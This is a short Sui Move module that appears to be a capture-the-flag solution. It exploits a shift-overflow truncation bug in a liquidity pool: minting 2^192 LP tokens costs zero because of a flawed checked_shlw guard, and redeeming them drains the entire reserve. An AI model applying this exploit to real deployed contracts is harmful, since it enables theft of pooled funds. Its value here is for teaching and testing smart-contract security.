module solution::solve;

use off_by_2_192::pool::{Self, Pool};
use sui::coin;
use sui::sui::SUI;

// 1 << 192 passes checked_shlw's `n > mask` guard but truncates to 0 required tokens:
// mint dominant LP for a zero payment, then redeem it for the whole reserve.
public fun solve(pool: &mut Pool, ctx: &mut TxContext) {
    let lp_amount: u256 = 1u256 << 192;
    let mut payment = coin::zero<SUI>(ctx);
    let lp = pool::add_liquidity(pool, lp_amount, &mut payment, ctx);
    coin::destroy_zero(payment);
    let loot = pool::remove_liquidity(pool, lp, ctx);
    transfer::public_transfer(loot, ctx.sender());
}
